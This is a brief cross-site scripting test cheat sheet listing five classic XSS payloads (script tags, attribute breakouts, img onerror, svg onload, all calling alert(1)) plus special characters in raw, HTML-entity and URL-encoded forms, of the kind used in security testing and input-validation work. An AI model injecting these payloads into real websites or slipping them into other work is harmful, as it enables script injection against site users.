

### **Injectable Characters List for XSS Testing**

```plaintext
<script>alert(1)</script>
"><script>alert(1)</script>
<img src="x" onerror="alert(1)">
';alert(1);// 
"><svg/onload=alert(1)>
& < > " ' / = ; \ ( ) + - [ ] ! : ? | $ @
&#60; &#62; &#34; &#39; &#38; &#40; &#41; &#43; &#45; &#91; &#93; &#33; &#58; &#63; &#124; &#36; &#64;
%3C %3E %22 %27 %26 %28 %29 %2B %2D %5B %5D %21 %3A %3F %7C %24 %40
```

